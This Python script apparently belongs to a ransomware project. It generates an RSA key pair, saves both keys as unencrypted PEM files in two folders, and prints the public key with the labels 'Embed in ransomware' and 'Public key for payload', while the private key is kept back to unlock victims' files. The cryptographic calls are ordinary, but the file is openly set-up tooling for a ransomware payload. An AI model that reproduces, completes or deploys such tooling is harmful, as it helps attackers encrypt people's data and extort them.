from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import os

def generate_rsa_keys():
    # Create both directories
    keys_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "Keys")
    data_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data")
    
    os.makedirs(keys_dir, exist_ok=True)
    os.makedirs(data_dir, exist_ok=True)

    print("\n\nGenerating RSA private key...")

    # Generate RSA Private Key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Get RSA Public Key
    public_key = private_key.public_key()

    # Save Private Key to PEM file (in both locations)
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    # Save to Keys directory
    with open(os.path.join(keys_dir, "private_key.pem"), "wb") as f:
        f.write(private_pem)
    
    # Save to data directory (for main.py compatibility)
    with open(os.path.join(data_dir, "operational_private.pem"), "wb") as f:
        f.write(private_pem)
    
    print("\nPrivate key saved to Keys/private_key.pem and data/operational_private.pem")

    # Save Public Key to PEM file (in both locations)
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Save to Keys directory
    with open(os.path.join(keys_dir, "public_key.pem"), "wb") as f:
        f.write(public_pem)
    
    # Save to data directory (for main.py compatibility)
    with open(os.path.join(data_dir, "operational_public.pem"), "wb") as f:
        f.write(public_pem)
    
    print("\nPublic key saved to Keys/public_key.pem and data/operational_public.pem")
    print("\nKey generation complete.")

    print("\n\n[+] Keys saved:")
    print("    private_key.pem - Keep this safe!")
    print("    public_key.pem  - Embed in ransomware")
    print("\n\n[+] Public key for payload:\n")
    print("*" * 50)
    print(public_pem.decode())
    print("*" * 50)

if __name__ == "__main__":
    generate_rsa_keys()